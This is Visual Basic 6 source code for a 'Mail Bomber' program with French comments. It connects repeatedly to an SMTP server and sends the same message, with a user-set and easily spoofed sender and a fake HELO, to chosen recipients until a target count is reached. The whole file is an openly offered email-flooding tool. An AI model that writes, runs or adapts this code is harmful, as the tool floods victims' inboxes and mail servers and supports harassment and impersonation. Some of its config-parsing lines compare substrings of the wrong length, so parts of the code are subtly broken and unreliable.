'control:
'Text2:TO
'Text7:TO
'Text3:FROM
'Text4:Server
'Text5:Text
'Text10:Nbr of msgs to send
'Text6:nb of sent msgs
'Text1:Log
'Timer1:check that everything was sent INTERVAL:10
'Command1:Stop
'Command5:Go
'label4:Status
'Winsock1


'buttons

Private Sub Command1_Click()
Label4.Caption = "Status:Deconnecter"
Winsock1.Close
End Sub


Private Sub Command5_Click()
On Error GoTo bob
Label4.Caption = "Status:Connection..."
Winsock1.RemoteHost = Text4.Text
Winsock1.Close
Winsock1.Connect
bob:
End Sub

'timer:
 
Private Sub Timer1_Timer()
Form1.Caption = "Mail Bomber " & Text6.Text & " messages envoyer sur :" & Text10.Text
If Text6.Text = Text10.Text Then End
End Sub


'winsock:

Private Sub Winsock1_Close()
Label4.Caption = "Status:Deconnecter"
Text6.Text = Val(Text6.Text) + 1
Winsock1.Close
Winsock1.Connect
End Sub
Private Sub Winsock1_Connect()
Label4.Caption = "Status:Connecter"
Winsock1.SendData "HELO 255.255.255.255" & vbCrLf
Winsock1.SendData "MAIL FROM:" & Text3.Text & vbCrLf
Winsock1.SendData "RCPT TO:" & Text2.Text & vbCrLf
Winsock1.SendData "RCPT TO:" & Text7.Text & vbCrLf
Winsock1.SendData "DATA" & vbCrLf & Text5.Text & vbCrLf & "." & vbCrLf & "QUIT" & vbCrLf
End Sub
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim a As String
Winsock1.GetData a
On Error GoTo b
Text1.Text = Text1.Text & vbCrLf & a
Exit Sub
b:
Text1.Text = ""
End Sub




'to be able to save config:

Private Sub Form_Load()
On Error GoTo erreur1
Open App.Path & "\Setup.ini" For Input As #2
Do While Not EOF(2)
Input #2, b
'Open msg
If Mid(b, 1, 5) = "[MSG]" Then
bob = "a"
GoTo buffer_skip_line
End If

'put msg in buffer
If bob = "a" Then
buffer = buffer & vbCrLf & b
End If
buffer_skip_line:
Loop
Close #2


erreur1:

On Error GoTo ERREUR
Open App.Path & "\Setup.ini" For Input As #1
Do While Not EOF(1)
Input #1, a
'SERVER
If Mid(a, 1, 7) = "SERVER:" Then
Text4.Text = Mid(a, 8, 100)
End If
'A
If Mid(a, 1, 2) = "TO:" Then
Text7.Text = Mid(a, 3, 100)
End If
'A #2
If Mid(a, 1, 3) = "CC:" Then
Text2.Text = Mid(a, 4, 100)
End If
'De
If Mid(a, 1, 3) = "FROM:" Then
Text3.Text = Mid(a, 4, 100)
End If
'nb of msgs
If Mid(a, 1, 5) = "#MSG:" Then
Text10.Text = Mid(a, 6, 10)
End If
'msg
If Mid(a, 1, 5) = "[MSG]" Then
Text5.Text = buffer
End If
Loop
Close #1

ERREUR:
End Sub
Private Sub Form_Unload(Cancel As Integer)
Open App.Path & "\Setup.ini" For Output As #3
Print #3, "SERVER:" & Text4.Text
Print #3, "TO:" & Text7.Text
Print #3, "CC:" & Text2.Text
Print #3, "FROM:" & Text3.Text
Print #3, "#MSG:" & Text10.Text
Print #3, "[MSG]" & vbCrLf & Text5.Text
Close #3
End Sub